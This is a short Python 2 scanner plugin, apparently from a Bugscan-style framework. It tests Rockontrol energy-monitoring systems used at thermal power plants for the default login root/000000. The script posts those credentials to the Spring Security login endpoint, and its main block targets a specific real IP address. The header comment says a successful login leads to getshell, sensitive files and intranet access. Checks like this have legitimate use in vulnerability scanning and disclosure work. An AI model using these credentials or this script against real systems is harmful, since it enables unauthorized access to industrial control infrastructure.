#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:工控安全之火力发电能耗监测弱口令(Getshell之后成功登陆/可查看敏感文件/可内网) 
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0145739
#Author:xq17
import re
import urlparse

def assign(service, arg):
    if service == 'rockontrol':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    url = arg +'j_spring_security_check'
    data = 'j_username=root&j_password=000000&submit1=%E7%99%BB%E5%BD%95'
    code,head,res,errcode,urls =curl.curl2(url,post=data)
    if code==302 and 'Location:' in head and 'error=true' not in head:
        security_hole('default user:root>>pass:000000>>'+arg)

if __name__ == '__main__':
    from dummy import *
    audit(assign('rockontrol','http://61.53.245.5/')[1])